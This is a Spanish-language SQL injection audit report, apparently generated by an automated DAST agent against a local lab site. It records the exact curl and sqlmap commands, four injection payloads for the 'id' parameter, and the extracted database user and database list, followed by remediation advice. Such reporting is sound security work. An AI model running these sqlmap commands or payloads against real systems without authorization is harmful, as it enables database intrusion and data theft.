# Informe de auditoría DAST - Inyecciones SQL

Fecha: 2026-04-13T11:06:58Z
Objetivo: http://web.dev.local:8083
Herramientas: curl, sqlmap (v1.9.10#stable)

## Resumen Ejecutivo
Se realizó un análisis dinámico (DAST) orientado a detectar y explotar vulnerabilidades de inyección SQL en el objetivo. Se encontró un parámetro GET vulnerable (id) y se logró explotar para obtener el usuario actual de la base de datos y la lista de bases de datos disponibles. Nivel de riesgo: Alto.

## Fase 1 — Reconocimiento
Comando ejecutado para obtener la página principal:
- curl -s -D - -L http://web.dev.local:8083/

Hallazgos iniciales:
- Página con un formulario GET que contiene el parámetro "id" (input name="id", method="GET").
- Tecnologías detectadas: Apache 2.4.65, PHP 8.1.33, MySQL/MariaDB en back-end.

Fragmento relevante del formulario HTML:
<form action="#" method="GET">
    <input type="text" name="id" id="id" />
    <input type="submit" name="Submit" value="Submit">
</form>

## Fase 2 — Descubrimiento (sqlmap)
Comando usado (detección):
- sqlmap -u "http://web.dev.local:8083/?id=1" --batch -p id --level=5 --risk=3

Salida relevante (resumen):
- Parámetro vulnerable: id (GET)
- Tipos de inyección detectados:
  * boolean-based blind
    Payload example:
    id=5029' AND 6551=(SELECT (CASE WHEN (6551=6551) THEN 6551 ELSE (SELECT 2428 UNION SELECT 1249) END))-- -&Submit=Submit

  * error-based (MySQL >= 5.0) - payload example:
    id=5029' OR (SELECT 8777 FROM(SELECT COUNT(*),CONCAT(0x71717a6a71,(SELECT (ELT(8777=8777,1))),0x717a716a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- mTmP&Submit=Submit

  * time-based blind (SLEEP) - payload example:
    id=5029' AND (SELECT 7778 FROM (SELECT(SLEEP(5)))JVzb)-- YZiE&Submit=Submit

  * UNION query (2 columns) - payload example:
    id=5029' UNION ALL SELECT NULL,CONCAT(0x71717a6a71,0x7266786d565148786279414c49575057486e62576c7a784d474c536d514662424c6c7042556d474b,0x717a716a71)-- -&Submit=Submit

El back-end DBMS identificado: MySQL (MariaDB fork).
Los resultados de sqlmap fueron guardados por sqlmap en: /home/kali_rdp/.local/share/sqlmap/output/web.dev.local

## Fase 3 — Explotación activa
Comando usado (explotación y extracción):
- sqlmap -u "http://web.dev.local:8083/?id=1" --batch -p id --current-user --dbs --level=5 --risk=3

Salida y evidencia extraída:
- Current user: 'root@%'
- Bases de datos encontradas [5]:
  - information_schema
  - mysql
  - performance_schema
  - sqli_demo
  - sys

Estos resultados demuestran que se pudo ejecutar consultas que revelan información sensible del servidor de base de datos.

## Evidencia técnica (fragmentos relevantes)
- sqlmap reportó explícitamente el payloads y que el parámetro "id" es vulnerable. Ejemplos de payloads (copiados del stdout de sqlmap) se incluyen en la sección anterior.
- Resultado de extracción:
  * current user: 'root@%'
  * dbs: information_schema, mysql, performance_schema, sqli_demo, sys

Además, sqlmap guardó trazas y datos en: /home/kali_rdp/.local/share/sqlmap/output/web.dev.local

## Impacto
- Un atacante que explote esta vulnerabilidad podría, dependiendo de privilegios, extraer información sensible (nombres de bases de datos, tablas, datos de usuarios) o, con privilegios suficientes, modificar o eliminar datos.
- El hecho de que el DBMS responda con el usuario 'root@%' indica que el proceso de la base de datos tiene permisos altos, incrementando el riesgo.

## Recomendaciones
1. Usar consultas parametrizadas (prepared statements) para todas las entradas del usuario.
2. Validación y saneamiento del input en el servidor (lista blanca donde sea posible).
3. Limitar los privilegios del usuario de la base de datos usado por la aplicación (no usar root).
4. Aplicar WAF o reglas de detección para mitigar inyecciones en el corto plazo.
5. Revisar y limpiar cualquier credencial o dato sensible filtrado.

## Comandos exactos ejecutados (resumen)
- curl -s -D - -L http://web.dev.local:8083/
- sqlmap -u "http://web.dev.local:8083/?id=1" --batch -p id --level=5 --risk=3
- sqlmap -u "http://web.dev.local:8083/?id=1" --batch -p id --current-user --dbs --level=5 --risk=3

## Conclusión
Se detectó y explotó una vulnerabilidad de inyección SQL en el parámetro GET "id". Se consiguió extraer el usuario actual de la base de datos (root@%) y la lista de bases de datos, lo que confirma explotación exitosa y representa un riesgo crítico para la confidencialidad e integridad de los datos.

---
Informe generado automáticamente por agente DAST (sqlmap).